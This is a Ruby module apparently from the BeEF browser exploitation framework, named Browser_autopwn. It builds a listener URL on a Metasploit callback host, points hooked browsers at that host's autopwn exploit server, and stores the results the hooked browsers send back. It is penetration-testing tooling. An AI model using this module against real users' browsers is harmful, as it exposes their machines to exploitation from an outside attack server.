#
#   Copyright 2011 Wade Alcorn wade@bindshell.net
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.
#
class Browser_autopwn < BeEF::Core::Command

    def self.options
		@conf = BeEF::Core::Configuration.instance
		@uri = 'Enter AutoPwn URL Here'
		begin
			if @conf.get('beef.extension.metasploit.enable')
				host = @conf.get('beef.extension.metasploit.callback_host')
				url = @conf.get('beef.extension.metasploit.autopwn_url')
				@uri = "http://#{host}:8080/#{url}"
			end
		end	
        return [
			  { 'name' => 'sploit_url', 'description' => 'The URL to exploit', 'ui_label' => 'Listener URL', 'value' => @uri, 'width'=>'200px' },
        ]
    end

  # This method is being called when a hooked browser sends some
  # data back to the framework.
  #
  def callback
    save({'result' => @datastore['result']})
  end
  
end
